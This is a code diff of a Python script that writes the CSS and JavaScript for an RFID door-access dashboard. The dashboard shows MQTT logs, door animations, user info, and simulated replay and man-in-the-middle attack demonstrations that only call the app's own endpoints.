     padding: 0.5rem 1rem;
     border-radius: 8px;
     cursor: pointer;
@@ -2194,174 +2538,75 @@ body {
     display: flex;
     align-items: center;
     gap: 0.5rem;
+    font-size: 0.9rem;
 }
 
 .clear-btn:hover {
-    background: rgba(74, 85, 104, 0.2);
+    background: rgba(220, 53, 69, 0.2);
 }
 
 .logs-content {
-    flex: 1;
-    padding: 1rem 2rem;
-    overflow-y: auto;
+    padding: 1rem;
     max-height: 400px;
+    overflow-y: auto;
 }
 
 .log-entry {
     display: grid;
-    grid-template-columns: 80px 120px 100px 1fr;
-    gap: 1rem;
-    padding: 0.75rem 0;
-    border-bottom: 1px solid rgba(0, 0, 0, 0.05);
-    font-size: 0.9rem;
-    animation: slideInLeft 0.3s ease;
+    grid-template-columns: 70px 120px 80px 1fr;
+    gap: 0.5rem;
+    padding: 0.75rem;
+    margin-bottom: 0.5rem;
+    background: rgba(248, 249, 250, 0.8);
+    border-radius: 8px;
+    font-size: 0.85rem;
+    border-left: 3px solid #dee2e6;
+    transition: all 0.3s ease;
+    align-items: center;
 }
 
-.log-entry:last-child {
-    border-bottom: none;
+.log-entry:hover {
+    background: rgba(102, 126, 234, 0.1);
+    border-left-color: #667eea;
 }
 
-.timestamp {
-    color: #a0aec0;
-    font-family: 'Courier New', monospace;
+.log-entry.system-start {
+    border-left-color: #28a745;
+    background: rgba(40, 167, 69, 0.1);
+}
+
+.log-entry .timestamp {
+    color: #6c757d;
+    font-weight: 600;
     font-size: 0.8rem;
 }
 
-.direction {
+.log-entry .direction {
+    color: #495057;
+    font-weight: 500;
+    font-size: 0.8rem;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+}
+
+.log-entry .type {
+    color: #667eea;
     font-weight: 600;
-    padding: 0.25rem 0.5rem;
-    border-radius: 12px;
-    text-align: center;
-    font-size: 0.75rem;
-}
-
-.direction:contains("ESP32→Server") {
-    background: rgba(59, 130, 246, 0.1);
-    color: #3b82f6;
-}
-
-.direction:contains("Server→ESP32") {
-    background: rgba(16, 185, 129, 0.1);
-    color: #10b981;
-}
-
-.type {
-    font-weight: 600;
-    color: #4a5568;
     text-transform: uppercase;
     font-size: 0.75rem;
-}
-
-.message {
-    color: #2d3748;
-}
-
-/* Attack Overlay */
-.attack-overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(0, 0, 0, 0.8);
-    z-index: 1000;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    backdrop-filter: blur(5px);
-}
-
-.attack-modal {
-    background: white;
-    border-radius: 20px;
-    width: 90%;
-    max-width: 600px;
-    max-height: 80vh;
+    white-space: nowrap;
     overflow: hidden;
-    animation: modalSlideIn 0.3s ease;
+    text-overflow: ellipsis;
 }
 
-.attack-modal-header {
-    background: linear-gradient(135deg, #ff6b6b, #ee5a52);
-    color: white;
-    padding: 2rem;
-    text-align: center;
-}
-
-.attack-modal-content {
-    padding: 2rem;
-    max-height: 60vh;
-    overflow-y: auto;
-}
-
-.attack-visualization {
-    text-align: center;
-    margin-bottom: 2rem;
-}
-
-.attack-step {
-    display: flex;
-    align-items: center;
-    margin: 1rem 0;
-    padding: 1rem;
-    background: #f7fafc;
-    border-radius: 10px;
-    border-left: 4px solid #ff6b6b;
-}
-
-.attack-step.active {
-    background: rgba(255, 107, 107, 0.1);
-    border-left-color: #ff6b6b;
-}
-
-.attack-step.completed {
-    background: rgba(72, 187, 120, 0.1);
-    border-left-color: #48bb78;
-}
-
-/* Animations */
-@keyframes slideInUp {
-    from {
-        opacity: 0;
-        transform: translateY(30px);
-    }
-    to {
-        opacity: 1;
-        transform: translateY(0);
-    }
-}
-
-@keyframes slideInDown {
-    from {
-        opacity: 0;
-        transform: translateY(-30px);
-    }
-    to {
-        opacity: 1;
-        transform: translateY(0);
-    }
-}
-
-@keyframes slideInLeft {
-    from {
-        opacity: 0;
-        transform: translateX(-30px);
-    }
-    to {
-        opacity: 1;
-        transform: translateX(0);
-    }
-}
-
-@keyframes modalSlideIn {
-    from {
-        opacity: 0;
-        transform: scale(0.9) translateY(-50px);
-    }
-    to {
-        opacity: 1;
-        transform: scale(1) translateY(0);
-    }
+.log-entry .message {
+    color: #2d3748;
+    font-size: 0.8rem;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    cursor: help;
 }
 
 /* Responsive Design */
@@ -2378,7 +2623,12 @@ body {
     }
     
     .status-indicators {
-        justify-content: center;
+        flex-direction: column;
+        gap: 0.5rem;
+    }
+    
+    .door-container {
+        padding: 2rem 1rem;
     }
     
     .attack-buttons {
@@ -2387,22 +2637,75 @@ body {
     
     .log-entry {
         grid-template-columns: 1fr;
-        gap: 0.5rem;
+        gap: 0.25rem;
         text-align: left;
     }
+    
+    .log-entry .timestamp,
+    .log-entry .direction,
+    .log-entry .type,
+    .log-entry .message {
+        white-space: normal;
+        word-break: break-word;
+    }
+}
+
+/* Animations */
+@keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.5; }
+}
+
+.rfid-reader.detecting {
+    animation: pulse 1s infinite;
+}
+
+@keyframes glow {
+    0%, 100% { box-shadow: 0 0 5px rgba(102, 126, 234, 0.5); }
+    50% { box-shadow: 0 0 20px rgba(102, 126, 234, 0.8); }
+}
+
+.rfid-reader.active {
+    animation: glow 2s infinite;
+}
+
+/* Scrollbar Styling */
+.logs-content::-webkit-scrollbar,
+.attack-logs::-webkit-scrollbar {
+    width: 6px;
+}
+
+.logs-content::-webkit-scrollbar-track,
+.attack-logs::-webkit-scrollbar-track {
+    background: rgba(0, 0, 0, 0.1);
+    border-radius: 3px;
+}
+
+.logs-content::-webkit-scrollbar-thumb,
+.attack-logs::-webkit-scrollbar-thumb {
+    background: rgba(102, 126, 234, 0.5);
+    border-radius: 3px;
+}
+
+.logs-content::-webkit-scrollbar-thumb:hover,
+.attack-logs::-webkit-scrollbar-thumb:hover {
+    background: rgba(102, 126, 234, 0.7);
 }'''
         
         with open(os.path.join(self.static_dir, "styles.css"), 'w', encoding='utf-8') as f:
             f.write(css_content)
-    
-    def create_javascript(self):
-        """Create JavaScript for interactivity"""
-        js_content = '''// Dashboard JavaScript
-const socket = io();
-let attackInterval = null;
-let attackProgress = 0;
+        
+        print("✅ CSS styles created")
 
-// Socket event handlers
+
+    def create_javascript(self):
+        """Create JavaScript for dashboard interactivity"""
+        js_content = '''// Dashboard JavaScript
+let socket = io();
+let attackInProgress = false;
+let currentAttackType = null;
+
+// Socket event listeners
 socket.on('connect', function() {
     console.log('Connected to server');
     updateConnectionStatus(true);
@@ -2417,321 +2720,299 @@ socket.on('mqtt_message', function(data) {
     addLogEntry(data);
 });
 
-socket.on('door_state', function(data) {
-    updateDoorState(data.state, data.message);
-});
-
 socket.on('door_animation', function(data) {
     animateDoor(data.state);
 });
 
-socket.on('auth_success', function(data) {
-    showUserInfo(data);
-    updateRFIDStatus('success');
+socket.on('door_state', function(data) {
+    updateDoorStatus(data.state, data.message);
+});
+
+socket.on('auth_success', function(userData) {
+    showUserInfo(userData);
+    animateDoor('open');
 });
 
 socket.on('auth_denied', function(data) {
     showAccessDenied(data);
-    updateRFIDStatus('error');
+    animateDoor('denied');
 });
 
-// Door animation functions
+socket.on('attack_step', function(data) {
+    updateAttackProgress(data);
+    addAttackLog(data);
+});
+
+socket.on('attack_complete', function(data) {
+    completeAttack(data);
+});
+
+socket.on('rfid_activity', function(data) {
+    updateRFIDActivity(data);
+});
+
+// Helper function to truncate long messages
+function truncateMessage(text, maxLength = 100) {
+    if (typeof text !== 'string') {
+        text = JSON.stringify(text);
+    }
+    
+    if (text.length <= maxLength) {
+        return text;
+    }
+    
+    return text.substring(0, maxLength) + '...';
+}
+
+// Helper function to format JSON data for display
+function formatLogData(data) {
+    try {
+        if (typeof data === 'object') {
+            // Extract key information for display
+            const keyInfo = [];
+            
+            if (data.type) keyInfo.push(`type: ${data.type}`);
+            if (data.session_id) keyInfo.push(`session: ${data.session_id.substring(0, 8)}...`);
+            if (data.card_uid) keyInfo.push(`uid: ${data.card_uid}`);
+            if (data.user_name) keyInfo.push(`user: ${data.user_name}`);
+            if (data.status) keyInfo.push(`status: ${data.status}`);
+            if (data.algorithm) keyInfo.push(`algo: ${data.algorithm}`);
+            
+            if (keyInfo.length > 0) {
+                return keyInfo.join(', ');
+            }
+            
+            // Fallback to truncated JSON
+            return truncateMessage(JSON.stringify(data), 80);
+        }
+        
+        return truncateMessage(data.toString(), 80);
+    } catch (e) {
+        return 'Invalid data format';
+    }
+}
+
+// Connection status
+function updateConnectionStatus(connected) {
+    const mqttStatus = document.getElementById('mqtt-status');
+    const span = mqttStatus.querySelector('span');
+    
+    if (connected) {
+        span.textContent = 'Connected';
+        mqttStatus.style.background = 'rgba(72, 187, 120, 0.1)';
+        mqttStatus.style.borderColor = 'rgba(72, 187, 120, 0.3)';
+        mqttStatus.style.color = '#38a169';
+    } else {
+        span.textContent = 'Disconnected';
+        mqttStatus.style.background = 'rgba(220, 53, 69, 0.1)';
+        mqttStatus.style.borderColor = 'rgba(220, 53, 69, 0.3)';
+        mqttStatus.style.color = '#dc3545';
+    }
+}
+
+// Door animations
 function animateDoor(state) {
     const door = document.getElementById('door');
     const doorStatus = document.getElementById('door-status');
-    const doorLeft = document.getElementById('door-left');
-    const doorRight = document.getElementById('door-right');
-    
-    door.className = 'door';
-    doorLeft.className = 'door-left';
-    doorRight.className = 'door-right';
-    
-    switch(state) {
-        case 'detecting':
-            updateDoorStatus('fas fa-search', 'Scanning Card...', '#3182ce');
-            updateRFIDStatus('active');
-            break;
-        case 'authenticating':
-            updateDoorStatus('fas fa-key', 'Authenticating...', '#d69e2e');
-            updateRFIDStatus('active');
-            break;
-        case 'open':
-            door.style.display = 'none';
-            doorLeft.style.display = 'block';
-            doorRight.style.display = 'block';
-            doorLeft.classList.add('open');
-            doorRight.classList.add('open');
-            updateDoorStatus('fas fa-door-open', 'Access Granted', '#38a169');
-            updateRFIDStatus('success');
-            break;
-        case 'closing':
-            door.style.display = 'block';
-            doorLeft.style.display = 'none';
-            doorRight.style.display = 'none';
-            door.classList.add('closing');
-            updateDoorStatus('fas fa-door-closed', 'Door Closing...', '#d69e2e');
-            break;
-        case 'closed':
-            door.style.display = 'block';
-            doorLeft.style.display = 'none';
-            doorRight.style.display = 'none';
-            door.className = 'door';
-            updateDoorStatus('fas fa-door-closed', 'Door Secured', '#4a5568');
-            hideUserInfo();
-            updateRFIDStatus('idle');
-            break;
-        case 'denied':
-            door.classList.add('denied');
-            updateDoorStatus('fas fa-times', 'Access Denied', '#e53e3e');
-            updateRFIDStatus('error');
-            break;
-    }
-}
-
-function updateDoorStatus(iconClass, text, color) {
-    const doorStatus = document.getElementById('door-status');
-    doorStatus.innerHTML = `<i class="${iconClass}"></i><span>${text}</span>`;
-    doorStatus.style.color = color;
-}
-
-function updateRFIDStatus(status) {
     const rfidReader = document.getElementById('rfid-reader');
     const rfidLight = document.getElementById('rfid-light');
     
-    rfidReader.className = 'rfid-reader';
-    rfidLight.className = 'rfid-light';
+    // Remove all animation classes
+    door.classList.remove('open', 'denied', 'detecting');
+    doorStatus.classList.remove('open', 'denied');
+    rfidReader.classList.remove('active', 'detecting');
+    rfidLight.classList.remove('active');
     
-    if (status === 'active') {
-        rfidReader.classList.add('active');
-        rfidLight.classList.add('active');
-    } else if (status === 'error') {
-        rfidLight.classList.add('error');
+    switch(state) {
+        case 'detecting':
+            rfidReader.classList.add('detecting');
+            rfidLight.classList.add('active');
+            break;
+        case 'authenticating':
+            rfidReader.classList.add('active');
+            rfidLight.classList.add('active');
+            break;
+        case 'open':
+            door.classList.add('open');
+            doorStatus.classList.add('open');
+            break;
+        case 'denied':
+            door.classList.add('denied');
+            doorStatus.classList.add('denied');
+            break;
+        case 'closed':
+            // Default state
+            break;
     }
-    
-    // Reset after 3 seconds
-    setTimeout(() => {
-        rfidReader.className = 'rfid-reader';
-        rfidLight.className = 'rfid-light';
-    }, 3000);
 }
 
-// User info functions
-function showUserInfo(data) {
+function updateDoorStatus(state, message) {
+    const doorStatus = document.getElementById('door-status');
+    const icon = doorStatus.querySelector('i');
+    const span = doorStatus.querySelector('span');
+    
+    switch(state) {
+        case 'detecting':
+            icon.className = 'fas fa-search';
+            span.textContent = message || 'Detecting Card...';
+            break;
+        case 'authenticating':
+            icon.className = 'fas fa-key';
+            span.textContent = message || 'Authenticating...';
+            break;
+        case 'open':
+            icon.className = 'fas fa-door-open';
+            span.textContent = 'Door Open';
+            break;
+        case 'denied':
+            icon.className = 'fas fa-times-circle';
+            span.textContent = 'Access Denied';
+            break;
+        default:
+            icon.className = 'fas fa-door-closed';
+            span.textContent = 'Door Closed';
+    }
+}
+
+// User information display
+function showUserInfo(userData) {
     const userInfo = document.getElementById('user-info');
-    const userPanel = document.getElementById('user-panel');
     const accessDenied = document.getElementById('access-denied');
     
-    // Hide access denied panel
+    // Hide access denied, show user info
     accessDenied.style.display = 'none';
+    userInfo.style.display = 'block';
     
-    // Update user info
-    document.getElementById('user-avatar').src = data.image;
-    document.getElementById('user-name').textContent = data.name;
-    document.getElementById('user-uid').textContent = `UID: ${data.uid}`;
-    document.getElementById('access-time').textContent = `Access granted at ${data.timestamp}`;
+    // Update user details
+    document.getElementById('user-avatar').src = userData.image;
+    document.getElementById('user-name').textContent = userData.name;
+    document.getElementById('user-uid').textContent = `UID: ${userData.uid}`;
+    document.getElementById('access-time').textContent = `Access granted at ${userData.timestamp}`;
     
     // Update permissions
     const permissionsContainer = document.getElementById('user-permissions');
     permissionsContainer.innerHTML = '';
-    data.permissions.forEach(permission => {
-        const permissionElement = document.createElement('span');
-        permissionElement.className = 'permission';
-        permissionElement.textContent = permission;
-        permissionsContainer.appendChild(permissionElement);
+    userData.permissions.forEach(permission => {
+        const tag = document.createElement('span');
+        tag.className = 'permission-tag';
+        tag.textContent = permission;
+        permissionsContainer.appendChild(tag);
     });
     
-    // Show user info
-    userInfo.style.display = 'block';
-    
-    // Auto hide after 10 seconds
-    setTimeout(hideUserInfo, 10000);
+    // Auto-hide after 8 seconds
+    setTimeout(() => {
+        userInfo.style.display = 'none';
+    }, 8000);
 }
 
 function showAccessDenied(data) {
     const userInfo = document.getElementById('user-info');
     const accessDenied = document.getElementById('access-denied');
     
-    // Hide user info
+    // Hide user info, show access denied
     userInfo.style.display = 'none';
+    accessDenied.style.display = 'block';
     
-    // Update denied info
+    // Update denied details
     document.getElementById('denied-reason').textContent = data.reason;
     document.getElementById('denied-uid').textContent = `UID: ${data.uid}`;
     
-    // Show access denied
-    accessDenied.style.display = 'block';
-    
-    // Auto hide after 5 seconds
+    // Auto-hide after 5 seconds
     setTimeout(() => {
         accessDenied.style.display = 'none';
     }, 5000);
 }
 
-function hideUserInfo() {
-    document.getElementById('user-info').style.display = 'none';
-    document.getElementById('access-denied').style.display = 'none';
-}
-
-// Log functions
-function addLogEntry(data) {
-    const logsContent = document.getElementById('logs-content');
-    const logEntry = document.createElement('div');
-    logEntry.className = 'log-entry';
+// RFID activity updates
+function updateRFIDActivity(data) {
+    const rfidLight = document.getElementById('rfid-light');
+    const rfidReader = document.getElementById('rfid-reader');
     
-    const directionClass = data.direction.includes('ESP32') ? 
-        (data.direction.includes('→Server') ? 'esp32-to-server' : 'server-to-esp32') : 'system';
-    
-    logEntry.innerHTML = `
-        <span class="timestamp">${data.timestamp}</span>
-        <span class="direction ${directionClass}">${data.direction}</span>
-        <span class="type">${data.type}</span>
-        <span class="message">${getLogMessage(data)}</span>
-        <span class="size">${data.message_size || 0}B</span>
-    `;
-    
-    logsContent.appendChild(logEntry);
-    logsContent.scrollTop = logsContent.scrollHeight;
-    
-    while (logsContent.children.length > 100) {
-        logsContent.removeChild(logsContent.firstChild);
-    }
-}
-
-function getLogMessage(data) {
-    const type = data.type;
-    const msgData = data.data;
-    
-    switch(type) {
+    switch(data.type) {
         case 'card_detected':
-            return `Card detected: ${msgData.card_uid} (${msgData.signal_strength || 'unknown'} dBm)`;
-        case 'auth_challenge':
-            return `Auth challenge: Session ${msgData.session_id} (${msgData.encryption_algorithm || 'AES-128'})`;
-        case 'auth_response':
-            return `Auth response: ${msgData.aes_operations || 0} AES ops, ${msgData.free_heap || 0}B heap`;
-        case 'auth_success':
-            return `✅ Access granted: ${msgData.user_name} (${msgData.permissions?.length || 0} perms)`;
-        case 'auth_rejected':
-            return `❌ Access denied: ${msgData.reason} (UID: ${msgData.card_uid})`;
+            rfidLight.classList.add('active');
+            rfidReader.classList.add('detecting');
+            break;
         case 'card_removed':
-            return `Card removed: ${msgData.card_uid}`;
-        case 'heartbeat':
-            return `💓 ESP32: ${msgData.free_heap}B heap, ${Math.floor(msgData.uptime/1000)}s uptime`;
-        case 'esp32_ready':
-            return `📟 ESP32 ready: v${msgData.version}, AES:${msgData.aes_support ? '✅' : '❌'}`;
-        case 'replay_attack':
-        case 'mitm_attack':
-            return `🔍 ${type}: Step ${msgData.step} - ${msgData.title}`;
-        default:
-            return JSON.stringify(msgData).substring(0, 80) + '...';
+            rfidLight.classList.remove('active');
+            rfidReader.classList.remove('detecting', 'active');
+            break;
     }
 }
 
-function clearLogs() {
-    document.getElementById('logs-content').innerHTML = `
-        <div class="log-entry system-start">
-            <span class="timestamp">--:--:--</span>
-            <span class="direction">SYSTEM</span>
-            <span class="type">INFO</span>
-            <span class="message">Logs cleared</span>
-        </div>
-    `;
-}
-
-// Connection status
-function updateConnectionStatus(connected) {
-    const mqttStatus = document.getElementById('mqtt-status');
-    const statusSpan = mqttStatus.querySelector('span');
-    
-    if (connected) {
-        statusSpan.textContent = 'Connected';
-        statusSpan.style.color = '#38a169';
-    } else {
-        statusSpan.textContent = 'Disconnected';
-        statusSpan.style.color = '#e53e3e';
-    }
-}
-
-// Attack simulation functions
+// Attack functions
 function startReplayAttack() {
-    if (attackInterval) return;
+    if (attackInProgress) return;
     
-    showAttackWindow('Detailed Replay Attack Analysis', 'replay');
-    showAttackOverlay('Replay Attack - Security Analysis');
+    attackInProgress = true;
+    currentAttackType = 'replay';
     
-    document.getElementById('stop-attack-btn').style.display = 'block';
+    // Update UI
     document.getElementById('replay-attack-btn').disabled = true;
     document.getElementById('mitm-attack-btn').disabled = true;
+    document.getElementById('stop-attack-btn').style.display = 'block';
     
-    fetch('/api/attack/start', {
+    // Show attack window
+    showAttackWindow('Replay Attack Simulation');
+    
+    // Start attack
+    fetch('/start_attack', {
         method: 'POST',
-        headers: {'Content-Type': 'application/json'},
+        headers: {
+            'Content-Type': 'application/json',
+        },
         body: JSON.stringify({type: 'replay'})
-    }).catch(err => console.error('Attack start failed:', err));
-}
-
-function startMITMAttack() {
-    if (attackInterval) return;
-    
-    showAttackWindow('Man-in-the-Middle Attack', 'mitm');
-    showAttackOverlay('Man-in-the-Middle Attack');
-    
-    attackProgress = 0;
-    const steps = [
-        'Setting up rogue access point...',
-        'Intercepting ESP32 communications...',
-        'Spoofing server responses...',
-        'Attempting to capture credentials...',
-        'Injecting malicious commands...',
-        'Trying to bypass mutual authentication...'
-    ];
-    
-    startAttackSimulation(steps, () => {
-        addAttackLog('🔴 MITM attack detected!');
-        addAttackLog('⚠️ Mutual authentication should prevent this');
-        addAttackLog('🛡️ Dilithium signatures provide protection');
     });
 }
 
-function startAttackSimulation(steps, onComplete) {
-    let currentStep = 0;
+function startMITMAttack() {
+    if (attackInProgress) return;
     
-    attackInterval = setInterval(() => {
-        if (currentStep < steps.length) {
-            addAttackLog(`Step ${currentStep + 1}: ${steps[currentStep]}`);
-            attackProgress = ((currentStep + 1) / steps.length) * 100;
-            updateAttackProgress(attackProgress);
-            currentStep++;
-        } else {
-            if (onComplete) onComplete();
-            clearInterval(attackInterval);
-            attackInterval = null;
-            
-            setTimeout(() => {
-                addAttackLog('🛑 Attack simulation completed');
-                addAttackLog('✅ Security measures are effective');
-            }, 1000);
-        }
-    }, 1500);
+    attackInProgress = true;
+    currentAttackType = 'mitm';
     
-    // Show stop button
-    document.getElementById('stop-attack-btn').style.display = 'block';
+    // Update UI
     document.getElementById('replay-attack-btn').disabled = true;
     document.getElementById('mitm-attack-btn').disabled = true;
+    document.getElementById('stop-attack-btn').style.display = 'block';
+    
+    // Show attack window
+    showAttackWindow('MITM Attack Simulation');
+    
+    // Start attack
+    fetch('/start_attack', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({type: 'mitm'})
+    });
 }
 
 function stopAttack() {
-    fetch('/api/attack/stop', {method: 'POST'})
-        .catch(err => console.error('Attack stop failed:', err));
+    if (!attackInProgress) return;
     
-    document.getElementById('stop-attack-btn').style.display = 'none';
-    document.getElementById('replay-attack-btn').disabled = false;
-    document.getElementById('mitm-attack-btn').disabled = false;
+    fetch('/stop_attack', {
+        method: 'POST'
+    });
     
-    closeAttackWindow();
-    hideAttackOverlay();
+    resetAttackUI();
 }
 
-function showAttackWindow(title, type) {
+function resetAttackUI() {
+    attackInProgress = false;
+    currentAttackType = null;
+    
+    // Reset buttons
+    document.getElementById('replay-attack-btn').disabled = false;
+    document.getElementById('mitm-attack-btn').disabled = false;
+    document.getElementById('stop-attack-btn').style.display = 'none';
+    
+    // Hide attack window
+    closeAttackWindow();
+}
+
+function showAttackWindow(title) {
     const attackWindow = document.getElementById('attack-window');
     const attackTitle = document.getElementById('attack-title');
     const attackLogs = document.getElementById('attack-logs');
@@ -2740,171 +3021,329 @@ function showAttackWindow(title, type) {
     attackLogs.innerHTML = '';
     attackWindow.style.display = 'block';
     
-    updateAttackProgress(0);
+    // Reset progress
+    updateProgressBar(0);
 }
 
 function closeAttackWindow() {
     document.getElementById('attack-window').style.display = 'none';
 }
 
-function showAttackOverlay(title) {
-    const overlay = document.getElementById('attack-overlay');
-    const modalTitle = document.getElementById('attack-modal-title');
-    const visualization = document.getElementById('attack-visualization');
+function updateAttackProgress(data) {
+    updateProgressBar(data.progress);
     
-    modalTitle.textContent = title;
-    
-    // Create attack visualization
-    if (title.includes('Replay')) {
-        visualization.innerHTML = createReplayVisualization();
-    } else if (title.includes('MITM')) {
-        visualization.innerHTML = createMITMVisualization();
+    // Update attack logs if waiting for card
+    if (data.waiting_for_card) {
+        const attackLogs = document.getElementById('attack-logs');
+        const waitingMessage = document.createElement('div');
+        waitingMessage.className = 'attack-log-entry';
+        waitingMessage.innerHTML = `
+            <h5>🚨 MITM Listener Active - Waiting for Card Scan</h5>
+            <ul>
+                <li>📱 Please scan your RFID card now to trigger MITM injection</li>
+                <li>⚡ Attack will automatically execute when card is detected</li>
+                <li>🛡️ Mutual authentication will block the attack</li>
+            </ul>
+        `;
+        attackLogs.appendChild(waitingMessage);
+        attackLogs.scrollTop = attackLogs.scrollHeight;
     }
-    
-    overlay.style.display = 'flex';
 }
 
-function hideAttackOverlay() {
-    document.getElementById('attack-overlay').style.display = 'none';
-}
-
-function createReplayVisualization() {
-    return `
-        <div class="attack-flow">
-            <div class="attack-node">📱 ESP32</div>
-            <div class="attack-arrow">→</div>
-            <div class="attack-node attacker">🕵️ Attacker</div>
-            <div class="attack-arrow">→</div>
-            <div class="attack-node">🖥️ Server</div>
-        </div>
-        <p>Attacker captures and replays authentication messages</p>
-    `;
-}
-
-function createMITMVisualization() {
-    return `
-        <div class="attack-flow">
-            <div class="attack-node">📱 ESP32</div>
-            <div class="attack-arrow">⚡</div>
-            <div class="attack-node attacker">🕵️ MITM</div>
-            <div class="attack-arrow">⚡</div>
-            <div class="attack-node">🖥️ Server</div>
-        </div>
-        <p>Attacker intercepts and modifies communications</p>
-    `;
-}
-
-function addAttackLog(message) {
+function addAttackLog(data) {
     const attackLogs = document.getElementById('attack-logs');
     const logEntry = document.createElement('div');
     logEntry.className = 'attack-log-entry';
+    
     logEntry.innerHTML = `
-        <span class="attack-timestamp">${new Date().toLocaleTimeString()}</span>
-        <span class="attack-message">${message}</span>
+        <h5>${data.title}</h5>
+        <ul>
+            ${data.details.map(detail => `<li>${detail}</li>`).join('')}
+        </ul>
     `;
+    
     attackLogs.appendChild(logEntry);
     attackLogs.scrollTop = attackLogs.scrollHeight;
 }
 
-function updateAttackProgress(progress) {
+function updateProgressBar(progress) {
     const progressBar = document.getElementById('attack-progress');
-    progressBar.style.width = progress + '%';
+    progressBar.style.setProperty('--progress', progress + '%');
+}
+
+function completeAttack(data) {
+    setTimeout(() => {
+        resetAttackUI();
+        
+        // Show completion message
+        alert(`Attack Complete!\\n\\nType: ${data.type.toUpperCase()}\\nSuccess: ${data.success}\\nBlocked by: ${data.blocked_by}`);
+    }, 2000);
+}
+
+// Enhanced Log management with truncation
+function addLogEntry(data) {
+    const logsContent = document.getElementById('logs-content');
+    const logEntry = document.createElement('div');
+    logEntry.className = 'log-entry';
+    
+    // Create log entry elements
+    const timestamp = document.createElement('span');
+    timestamp.className = 'timestamp';
+    timestamp.textContent = data.timestamp;
+    
+    const direction = document.createElement('span');
+    direction.className = 'direction';
+    direction.textContent = truncateMessage(data.direction, 15);
+    
+    const type = document.createElement('span');
+    type.className = 'type';
+    type.textContent = data.type;
+    
+    const message = document.createElement('span');
+    message.className = 'message';
+    message.textContent = formatLogData(data.data);
+    message.title = JSON.stringify(data.data, null, 2); // Show full data on hover
+    
+    // Append elements
+    logEntry.appendChild(timestamp);
+    logEntry.appendChild(direction);
+    logEntry.appendChild(type);
+    logEntry.appendChild(message);
+    
+    // Add to logs
+    logsContent.appendChild(logEntry);
+    
+    // Auto-scroll to bottom
+    logsContent.scrollTop = logsContent.scrollHeight;
+    
+    // Limit log entries
+    const logEntries = logsContent.querySelectorAll('.log-entry');
+    if (logEntries.length > 100) {
+        logEntries[0].remove();
+    }
+}
+
+function clearLogs() {
+    const logsContent = document.getElementById('logs-content');
+    const systemStart = logsContent.querySelector('.system-start');
+    
+    // Clear all except system start message
+    logsContent.innerHTML = '';
+    if (systemStart) {
+        logsContent.appendChild(systemStart);
+    }
 }
 
 // Initialize dashboard
 document.addEventListener('DOMContentLoaded', function() {
     console.log('Dashboard initialized');
     
-    // Add some initial log entries
-    setTimeout(() => {
-        addLogEntry({
-            timestamp: new Date().toLocaleTimeString(),
-            direction: 'SYSTEM',
-            type: 'INFO',
-            data: { message: 'Dashboard ready - waiting for RFID events...' }
-        });
-    }, 1000);
-});
-
-// Handle attack overlay clicks
-document.getElementById('attack-overlay').addEventListener('click', function(e) {
-    if (e.target === this) {
-        hideAttackOverlay();
+    // Set initial timestamp for system start message
+    const systemStart = document.querySelector('.system-start .timestamp');
+    if (systemStart) {
+        systemStart.textContent = new Date().toLocaleTimeString();
     }
 });'''
         
         with open(os.path.join(self.static_dir, "dashboard.js"), 'w', encoding='utf-8') as f:
             f.write(js_content)
-    
+
     def create_user_images(self):
         """Create placeholder user images"""
-        # Create simple SVG images for users
-        user1_svg = '''<svg width="100" height="100" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-            <circle cx="50" cy="50" r="50" fill="#4299e1"/>
-            <circle cx="50" cy="35" r="15" fill="white"/>
-            <ellipse cx="50" cy="75" rx="25" ry="20" fill="white"/>
-            <text x="50" y="95" text-anchor="middle" fill="white" font-size="8">User 1</text>
-        </svg>'''
+        try:
+            # Try to import PIL, if not available create simple text files
+            from PIL import Image, ImageDraw, ImageFont
+            
+            users = [
+                {"name": "user1.jpg", "color": "#3498db", "text": "USER 1"},
+                {"name": "user2.JPG", "color": "#e74c3c", "text": "USER 2"}, 
+                {"name": "admin.png", "color": "#f39c12", "text": "ADMIN"},
+                {"name": "guest.png", "color": "#95a5a6", "text": "GUEST"},
+                {"name": "default_user.png", "color": "#9b59b6", "text": "DEFAULT"}
+            ]
+            
+            for user in users:
+                # Create 200x200 image
+                img = Image.new('RGB', (200, 200), user["color"])
+                draw = ImageDraw.Draw(img)
+                
+                # Try to use a font, fall back to default if not available
+                try:
+                    font = ImageFont.truetype("arial.ttf", 24)
+                except:
+                    font = ImageFont.load_default()
+                
+                # Calculate text position (center)
+                bbox = draw.textbbox((0, 0), user["text"], font=font)
+                text_width = bbox[2] - bbox[0]
+                text_height = bbox[3] - bbox[1]
+                
+                position = ((200 - text_width) // 2, (200 - text_height) // 2)
+                
+                # Draw text
+                draw.text(position, user["text"], fill="white", font=font)
+                
+                # Save image
+                img_path = os.path.join(self.static_dir, "images", user["name"])
+                img.save(img_path)
+            
+            print("✅ User placeholder images created with PIL")
+            
+        except ImportError:
+            # PIL not available, create simple SVG placeholders
+            print("⚠️ PIL not available, creating SVG placeholders...")
+            
+            users = [
+                {"name": "user1.jpg", "color": "#3498db", "text": "USER 1"},
+                {"name": "user2.JPG", "color": "#e74c3c", "text": "USER 2"}, 
+                {"name": "admin.png", "color": "#f39c12", "text": "ADMIN"},
+                {"name": "guest.png", "color": "#95a5a6", "text": "GUEST"},
+                {"name": "default_user.png", "color": "#9b59b6", "text": "DEFAULT"}
+            ]
+            
+            for user in users:
+                # Create simple SVG placeholder
+                svg_content = f'''<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="200" height="200" fill="{user["color"]}"/>
+                    <text x="100" y="100" font-family="Arial" font-size="20" fill="white" text-anchor="middle" dominant-baseline="middle">
+                        {user["text"]}
+                    </text>
+                </svg>'''
+                
+                # Save as SVG file (change extension to .svg)
+                svg_name = user["name"].rsplit('.', 1)[0] + '.svg'
+                svg_path = os.path.join(self.static_dir, "images", svg_name)
+                
+                with open(svg_path, 'w', encoding='utf-8') as f:
+                    f.write(svg_content)
+            
+            print("✅ SVG placeholder images created")
         
-        user2_svg = '''<svg width="100" height="100" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-            <circle cx="50" cy="50" r="50" fill="#48bb78"/>
